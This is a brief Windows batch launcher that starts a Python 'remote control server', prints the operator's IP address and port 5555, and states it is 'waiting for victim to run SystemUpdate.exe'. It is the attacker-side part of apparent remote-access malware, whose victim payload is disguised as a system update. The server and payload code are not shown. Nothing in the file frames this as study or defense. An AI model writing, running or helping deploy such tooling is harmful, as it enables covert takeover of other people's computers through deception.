@echo off
echo Starting Remote Control Server...
echo.
echo [*] Your IP: 172.28.1.78
echo [*] Port: 5555
echo [*] Waiting for victim to run SystemUpdate.exe...
echo.
echo Keep this window open!
echo.

REM Start server
python server_professional.py
